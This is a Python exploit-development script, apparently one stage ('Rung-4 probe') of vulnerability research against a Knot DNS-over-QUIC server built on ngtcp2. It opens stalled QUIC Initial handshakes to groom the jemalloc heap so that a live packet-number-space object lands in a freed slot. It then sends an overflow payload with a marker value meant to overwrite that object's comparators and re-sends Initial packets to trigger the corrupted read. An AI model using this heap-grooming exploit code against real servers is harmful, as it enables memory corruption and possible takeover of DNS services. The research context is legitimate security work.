#!/usr/bin/env python3
"""Rung-4 probe: occupy buf+6144 with a LIVE Initial pktns.

Wake 6 showed slot1 is a stale/freed NGTCP2_PKTNS_ID_INITIAL with no live
owner.  Open an extra QUIC connection, send only its Initial ClientHello and
never feed the server's replies back, so the server's in_pktns for that
connection stays allocated and live.  If jemalloc reuses the freed slot,
that live in_pktns is at slot1 when F6 overwrites its comparators.
Loopback only.
"""
import asyncio
import os
import socket
import ssl
import sys
import time

import struct
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "poc", "knot-doq"))
import poc  # noqa: E402
from aioquic.asyncio.client import connect  # noqa: E402
from aioquic.quic.connection import QuicConnection  # noqa: E402

HOST = "127.0.0.1"
def stall_initial(port, count=1):
    """Send Initial flights from stalled clients; return (socket, datagrams)."""
    out = []
    for _ in range(count):
        cfg = poc.QuicConfiguration(is_client=True, alpn_protocols=["doq"])
        cfg.verify_mode = ssl.CERT_NONE
        cfg.max_datagram_size = 1500
        q = QuicConnection(configuration=cfg)
        q.connect((HOST, port), now=time.time())
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((HOST, 0))
        datagrams = []
        for data, _addr in q.datagrams_to_send(now=time.time()):
            sock.sendto(data, (HOST, port))
            datagrams.append(data)
        out.append((sock, datagrams))
    return out


async def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8855
    nstall = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    off = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0xa0
    marker = int(sys.argv[4], 0) if len(sys.argv) > 4 else 0x4141414141414141
    stalled = stall_initial(port, nstall)
    payload = bytearray(1198)
    payload[0:384] = b"\xAA" * 384
    payload[384 + off:384 + off + 8] = struct.pack("<Q", marker)
    print("[driver] stalled Initial flights=%d, firing F1..F6" % nstall, flush=True)

    cfg = poc.QuicConfiguration(is_client=True, alpn_protocols=["doq"])
    cfg.verify_mode = ssl.CERT_NONE
    cfg.max_datagram_size = 1500
    cfg.idle_timeout = 20.0
    cfg.max_data = 64 * 1024
    cfg.max_stream_data = 32 * 1024
    async with connect(HOST, port, configuration=cfg) as proto:
        sid = proto._quic.get_next_available_stream_id(False)
        await poc._escalate(proto, sid)
        await poc._flush(proto, sid, b"\xFF\xFF" + payload, fin=True)
        print("[driver] F6 fired", flush=True)
        # Re-send each stalled Initial flight: valid new packets for the
        # server's still-live in_pktns, to force a gaptr/ksl read.
        for sock, datagrams in stalled:
            await asyncio.sleep(0.2)
            for data in datagrams:
                sock.sendto(data, (HOST, port))
            print("[driver] re-sent %d Initial datagrams" % len(datagrams), flush=True)
        sid2 = proto._quic.get_next_available_stream_id(False)
        await poc._flush(proto, sid2, poc.dns_query(), fin=True)
        print("[driver] trailing DNS query on stream %d" % sid2, flush=True)
        await asyncio.sleep(2.0)
    for sock, _datagrams in stalled:
        sock.close()
    print("[driver] done", flush=True)


if __name__ == "__main__":
    asyncio.run(main())
